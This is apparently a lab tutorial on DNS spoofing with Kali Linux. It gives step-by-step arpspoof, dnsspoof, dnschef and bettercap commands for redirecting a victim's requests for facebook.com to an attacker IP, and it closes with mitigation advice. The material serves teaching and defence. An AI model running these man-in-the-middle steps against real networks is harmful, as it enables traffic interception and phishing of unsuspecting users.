### Objective

Understand and perform DNS spoofing using different tools on Kali Linux. DNS spoofing is the process of intercepting and modifying DNS requests to redirect the victim to a different IP address.

---

## Table of Contents

1. Prerequisites
2. DNS Spoofing with `dnsspoof`
3. DNS Spoofing with `dnschef`
4. DNS Spoofing with `bettercap`
5. Local DNS Spoofing (Self-Spoofing)
6. Mitigation Techniques

---

## 1. Prerequisites

- Two devices on the same network (Attacker and Victim)
- Kali Linux as the attacker machine
- Root privileges
- Tools: dnsspoof, dnschef, bettercap
- Basic understanding of DNS and ARP

Enable IP forwarding on the attacker machine to allow traffic to pass through:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

This command enables packet forwarding so the attacker's machine can relay traffic between the victim and the internet after performing ARP and DNS spoofing.

---

## 2. DNS Spoofing with `dnsspoof`

**Step 1: Create a DNS Hosts File**

Create a file named `dnshosts` with the fake domain entries.

```bash
nano dnshosts
```

Example content:

```
192.168.1.100 facebook.com
192.168.1.100 www.facebook.com
```

This file tells `dnsspoof` to respond to DNS requests for these domains with the fake IP `192.168.1.100`.

### Step 2: Perform ARP Spoofing

You must first become a man-in-the-middle using ARP spoofing.

```bash
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
```

Explanation:
- `-i eth0`: Interface to use.
- `-t 192.168.1.5`: Target IP (Victim).
- `192.168.1.1`: Gateway IP.
This tells the victim that the attacker is the gateway.

In another terminal, spoof the gateway:

```bash
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5
```

This tells the router that the attacker is the victim.

### Step 3: Start `dnsspoof`

```bash
dnsspoof -i eth0 -f dnshosts
```

- `-i eth0`: Interface to listen on.
- `-f dnshosts`: Hosts file with spoofed DNS entries.

This listens for DNS queries on the network and responds with the IPs specified in `dnshosts`.

---

## 3. DNS Spoofing with `dnschef`

`dnschef` is a flexible DNS proxy that allows you to specify fake responses for any domain.

### Step 1: Start a Fake DNS Server

```bash
dnschef --fakeip 192.168.1.100 --fakedomains facebook.com,www.facebook.com
```

Explanation:
- `--fakeip`: The IP address to return.
- `--fakedomains`: Domains to spoof.

### Step 2: Change DNS Settings on Victim (or your own device)

Point the DNS server of the victim to the attacker (192.168.1.100). This can be done in the victim's network settings or forcibly via DHCP or ARP spoofing.

---

## 4. DNS Spoofing with `bettercap`

Bettercap is a powerful MITM framework that supports DNS spoofing out of the box.

### Step 1: Start Bettercap

```bash
sudo bettercap -iface eth0
```

### Step 2: Configure DNS Spoofing

In the Bettercap interactive shell:

```bash
set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.1.100
dns.spoof on
```

Explanation:
- The `dns.spoof.domains` variable sets which domain to spoof.
- `dns.spoof.address` is the IP to return in DNS replies.
- `dns.spoof on` enables DNS spoofing.

Bettercap intercepts DNS requests and responds with the spoofed IP address.

---

## 5. DNS Spoofing on Localhost (Self-Spoofing)

### Option 1: Edit `/etc/hosts`

```bash
sudo nano /etc/hosts
```

Add:
```
127.0.0.1 facebook.com
```

Any request for `facebook.com` on your machine will now point to `127.0.0.1`.

### Option 2: Use `dnschef` Locally

```bash
dnschef --fakeip 127.0.0.1 --fakedomains facebook.com,www.facebook.com
```

Set your DNS to `127.0.0.1`:

```bash
nmcli con mod "Wired connection 1" ipv4.dns "127.0.0.1"
nmcli con up "Wired connection 1"
```

Now all DNS queries for `facebook.com` go to `127.0.0.1`.

---

## 6. Mitigation Techniques

- Use DNSSEC where possible.
- Monitor DNS and ARP tables regularly.
- Use encrypted DNS (DNS over HTTPS/TLS).
- Employ firewall rules or IDS tools (Snort, Suricata) to detect spoofing attempts.

---

## Summary

| Tool       | Purpose                  | Works on LAN | Localhost Spoof | Requires ARP Spoofing |
|------------|---------------------------|--------------|------------------|------------------------|
| dnsspoof   | Network DNS spoofing      | Yes          | No               | Yes                    |
| dnschef    | Fake DNS server           | Yes          | Yes              | No (if DNS manually set) |
| bettercap  | Full MITM + DNS spoofing  | Yes          | No               | Optional               |

---

## Notes

- Always test in a legal lab environment.
- DNS spoofing is detectable with basic tools like `dig`, `nslookup`, and `Wireshark`.
- HTTPS protection (HSTS) can prevent phishing in some spoofing scenarios unless combined with SSL stripping.
